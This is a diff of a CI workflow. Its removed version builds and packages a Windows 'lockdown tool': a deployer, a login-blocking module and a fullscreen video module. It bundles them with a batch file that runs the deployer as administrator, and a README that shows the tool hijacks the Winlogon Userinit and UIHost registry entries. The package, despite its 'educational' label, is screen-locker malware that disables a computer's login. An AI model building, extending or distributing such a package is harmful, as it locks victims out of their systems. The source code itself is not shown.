@@ -1,249 +1,31 @@
-name: Build Windows Lockdown Tool
+name: Build
 
 on:
   push:
-    branches: [ "main", "master" ]
-  pull_request:
-    branches: [ "main", "master" ]
+    branches: [ main ]
   workflow_dispatch:
-
-env:
-  CARGO_TERM_COLOR: always
 
 jobs:
   build:
     runs-on: windows-latest
-    
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v4
-    
-    - name: Display directory structure
-      run: |
-        Write-Host "=== Current directory ==="
-        Get-Location
-        Write-Host "`n=== Files and folders ==="
-        Get-ChildItem -Force
-        Write-Host "`n=== Directory tree ==="
-        Get-ChildItem -Recurse -Depth 2 | Select-Object FullName, Length
-    
-    - name: Setup Rust
-      uses: actions-rs/toolchain@v1
-      with:
-        toolchain: stable
-        target: x86_64-pc-windows-msvc
-        override: true
-        components: rustfmt, clippy
-    
-    - name: Cache cargo registry
-      uses: actions/cache@v3
-      with:
-        path: |
-          ~/.cargo/bin/
-          ~/.cargo/registry/index/
-          ~/.cargo/registry/cache/
-          ~/.cargo/git/db/
-          target/
-        key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}
-        restore-keys: |
-          ${{ runner.os }}-cargo-
-    
-    - name: Create dummy video.mp4 for build
-      run: |
-        Write-Host "Creating dummy video.mp4..."
-        # Минимальный валидный MP4 заголовок
-        $header = [System.Convert]::FromBase64String("AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJhZQ==")
-        [System.IO.File]::WriteAllBytes("video.mp4", $header)
-        Write-Host "video.mp4 created: $((Get-Item video.mp4).Length) bytes"
-    
-    - name: Build release binaries
-      run: |
-        Write-Host "Building release binaries..."
-        cargo build --release --target x86_64-pc-windows-msvc
-        Write-Host "Build completed successfully!"
-    
-    - name: List built artifacts
-      run: |
-        Write-Host "`n=== Built executables ==="
-        $exeFiles = Get-ChildItem -Path target\x86_64-pc-windows-msvc\release\*.exe
-        foreach ($file in $exeFiles) {
-            $sizeKB = [math]::Round($file.Length / 1KB, 2)
-            Write-Host "$($file.Name) - $sizeKB KB"
-        }
-        Write-Host "`n=== Checking for specific files ==="
-        $required = @("deployer.exe", "gate_keeper.exe", "screen_holder.exe")
-        foreach ($name in $required) {
-            $path = "target\x86_64-pc-windows-msvc\release\$name"
-            if (Test-Path $path) {
-                Write-Host "✓ $name found"
-            } else {
-                Write-Host "✗ $name NOT found"
-            }
-        }
-    
-    - name: Prepare deployment package
-      run: |
-        Write-Host "Creating deployment package..."
-        New-Item -ItemType Directory -Force -Path deploy | Out-Null
-        
-        # Копируем бинарники
-        $files = @("deployer.exe", "gate_keeper.exe", "screen_holder.exe")
-        foreach ($f in $files) {
-            $src = "target\x86_64-pc-windows-msvc\release\$f"
-            if (Test-Path $src) {
-                Copy-Item $src deploy\
-                Write-Host "✓ Copied $f"
-            } else {
-                Write-Host "✗ $f not found, skipping"
-            }
-        }
-        
-        # Копируем видео
-        if (Test-Path "video.mp4") {
-            Copy-Item video.mp4 deploy\
-            Write-Host "✓ Copied video.mp4"
-        }
-        
-        # Создаём run.bat
-        $runBat = @"
-@echo off
-title Zero Entry Installer
-color 4F
-echo ========================================
-echo  WINDOWS LOCKDOWN TOOL - INSTALLER
-echo ========================================
-echo.
-echo ВНИМАНИЕ! Данный инструмент предназначен
-echo для образовательных целей.
-echo.
-echo Установка требует прав администратора.
-echo.
-pause
-powershell -Command "Start-Process -FilePath '.\deployer.exe' -Verb RunAs -Wait"
-echo.
-echo Установка завершена. Система будет перезагружена.
-pause
-"@
-        [System.IO.File]::WriteAllLines("deploy\run.bat", $runBat, [System.Text.Encoding]::ASCII)
-        Write-Host "✓ Created run.bat"
-        
-        # Создаём README.txt
-        $readme = @"
-=============================================
-WINDOWS LOCKDOWN TOOL - v1.0.0
-=============================================
-
-СОСТАВ:
-- deployer.exe      - установщик (запускать от администратора)
-- gate_keeper.exe   - модуль блокировки входа
-- screen_holder.exe - модуль воспроизведения видео
-- video.mp4         - видеофайл (опционально)
-
-ИНСТРУКЦИЯ:
-1. Распаковать архив
-2. Запустить run.bat или deployer.exe от имени администратора
-3. Система перезагрузится автоматически
-
-ВОССТАНОВЛЕНИЕ:
-- Загрузиться с LiveUSB/LiveCD
-- Открыть реестр (regedit) с загрузкой HKEY_LOCAL_MACHINE
-- Восстановить ветку:
-  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
-  Userinit = "userinit.exe,"
-  UIHost = "logonui.exe"
-- Удалить файлы из C:\Windows\System32:
-  deployer.exe, gate_keeper.exe, screen_holder.exe
-
-=============================================
-(c) Educational Purpose Only
-=============================================
-"@
-        [System.IO.File]::WriteAllLines("deploy\README.txt", $readme, [System.Text.Encoding]::ASCII)
-        Write-Host "✓ Created README.txt"
-        
-        Write-Host "`n=== Package contents ==="
-        Get-ChildItem deploy\
-    
-    - name: Upload artifacts
-      uses: actions/upload-artifact@v4
-      with:
-        name: lockdown-tool-windows
-        path: deploy/
-        retention-days: 30
-        if-no-files-found: error
-    
-    - name: Create ZIP archive
-      run: |
-        Write-Host "Creating ZIP archive..."
-        Compress-Archive -Path deploy\* -DestinationPath lockdown_tool.zip -Force -CompressionLevel Optimal
-        $zipSize = [math]::Round((Get-Item lockdown_tool.zip).Length / 1KB, 2)
-        Write-Host "Archive created: lockdown_tool.zip ($zipSize KB)"
-    
-    - name: Upload ZIP archive
-      uses: actions/upload-artifact@v4
-      with:
-        name: lockdown-tool-archive
-        path: lockdown_tool.zip
-        retention-days: 30
-        if-no-files-found: error
-
-  verify:
-    name: Verify Build
-    runs-on: windows-latest
-    needs: build
-    
-    steps:
-    - name: Download artifacts
-      uses: actions/download-artifact@v4
-      with:
-        name: lockdown-tool-windows
-        path: downloaded
-    
-    - name: Verify downloaded files
-      run: |
-        Write-Host "=== Downloaded files ==="
-        Get-ChildItem downloaded\
-        
-        Write-Host "`n=== Checking PE files ==="
-        $exeFiles = Get-ChildItem downloaded\*.exe
-        foreach ($exe in $exeFiles) {
-            $bytes = [System.IO.File]::ReadAllBytes($exe.FullName)
-            if ($bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A) {
-                Write-Host "✓ $($exe.Name) - valid PE executable"
-            } else {
-                Write-Host "✗ $($exe.Name) - invalid PE file"
-                exit 1
-            }
-        }
-        
-        Write-Host "`n=== File sizes ==="
-        Get-ChildItem downloaded\ | ForEach-Object {
-            $sizeKB = [math]::Round($_.Length / 1KB, 2)
-            Write-Host "$($_.Name): $sizeKB KB"
-        }
-
-  lint:
-    name: Lint Code
-    runs-on: ubuntu-latest
-    
-    steps:
-    - name: Checkout
-      uses: actions/checkout@v4
-    
-    - name: Setup Rust
-      uses: actions-rs/toolchain@v1
-      with:
-        toolchain: stable
-        override: true
-        components: rustfmt, clippy
-    
-    - name: Create dummy video
-      run: touch video.mp4
-    
-    - name: Check formatting
-      run: cargo fmt -- --check
-      continue-on-error: true
-    
-    - name: Run clippy
-      run: cargo clippy --target x86_64-unknown-linux-gnu -- -D warnings
-      continue-on-error: true
+      - uses: actions/checkout@v4
+      
+      - name: Setup Rust
+        uses: actions-rs/toolchain@v1
+        with:
+          toolchain: stable
+          target: x86_64-pc-windows-msvc
+          override: true
+      
+      - name: Create dummy video
+        run: New-Item -Path "video.mp4" -ItemType File -Force
+      
+      - name: Build
+        run: cargo build --release --target x86_64-pc-windows-msvc
+      
+      - name: Upload binaries
+        uses: actions/upload-artifact@v4
+        with:
+          name: binaries
+          path: target/x86_64-pc-windows-msvc/release/*.exe
